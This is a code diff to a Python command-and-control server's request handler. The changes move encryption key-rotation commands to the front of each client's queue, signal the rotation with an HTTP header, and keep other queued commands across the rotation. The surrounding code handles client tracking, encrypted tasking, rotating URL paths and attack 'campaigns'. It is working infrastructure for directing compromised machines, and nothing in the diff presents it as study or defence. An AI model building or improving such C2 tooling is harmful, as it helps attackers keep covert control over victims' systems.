@@ -369,9 +369,20 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             client_id = ip
             self.client_manager.add_client(client_id)
         
-        # Process commands to send to client
         commands = self.client_manager.get_pending_commands(client_id)
         self.logger(f"Commands to send to client {client_id}: {commands}")
+        
+        # If a key rotation command is in the queue, move it to the front
+        # This ensures key rotation happens before other commands
+        has_key_rotation = False
+        for i, command in enumerate(commands):
+            if command.get('command_type') == 'key_rotation':
+                has_key_rotation = True
+                # Move it to the front if it's not already
+                if i > 0:
+                    rotation_command = commands.pop(i)
+                    commands.insert(0, rotation_command)
+                break
         
         # Add key rotation command if needed and the client has been verified
         if key_rotation_needed:
@@ -388,12 +399,19 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
                 "command_type": "key_rotation",
                 "args": base64_key
             }
-            commands.append(key_rotation_command)
+            
+            # Add to the beginning of the command list to ensure it's processed first
+            commands.insert(0, key_rotation_command)
+            has_key_rotation = True
             self.logger(f"Key rotation command issued for client {client_id}")
         
         # Log the command sent to the client
         for command in commands:
-            self.client_manager.log_event(client_id, "Command send", f"Type: {command['command_type']}, Args: {command['args'] if command['command_type'] != 'key_rotation' else '[REDACTED KEY]'}")
+            self.client_manager.log_event(
+                client_id, 
+                "Command send", 
+                f"Type: {command['command_type']}, Args: {command['args'] if command['command_type'] != 'key_rotation' else '[REDACTED KEY]'}"
+            )
         
         # Add path rotation information if needed
         if include_rotation_info:
@@ -422,9 +440,37 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         # Include current rotation ID in header to keep client in sync
         self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
         self.send_header("X-Next-Rotation", str(self.path_manager.get_next_rotation_time()))
+        
+        # Add a key rotation flag to help client know how to handle response
+        if has_key_rotation:
+            self.send_header("X-Key-Rotation", "true")
+        
         self.end_headers()
         self.wfile.write(encrypted_commands.encode("utf-8"))
-        self.client_manager.clear_pending_commands(client_id)
+        
+        # Only clear pending commands if we actually sent them
+        # This ensures we don't lose commands during key rotation
+        if not has_key_rotation:
+            self.client_manager.clear_pending_commands(client_id)
+        else:
+            # If key rotation is happening, only clear the key rotation command
+            # and keep other commands in the queue
+            pending_commands = self.client_manager.get_pending_commands(client_id)
+            new_pending = []
+            for cmd in pending_commands:
+                if cmd.get('command_type') != 'key_rotation':
+                    new_pending.append(cmd)
+            
+            # Temporarily clear all commands
+            self.client_manager.clear_pending_commands(client_id)
+            
+            # Add back the non-key-rotation commands
+            for cmd in new_pending:
+                self.client_manager.add_command(
+                    client_id, 
+                    cmd.get('command_type'), 
+                    cmd.get('args')
+                )
 
     def _get_campaign_name(self):
         """Helper method to get the active campaign name"""
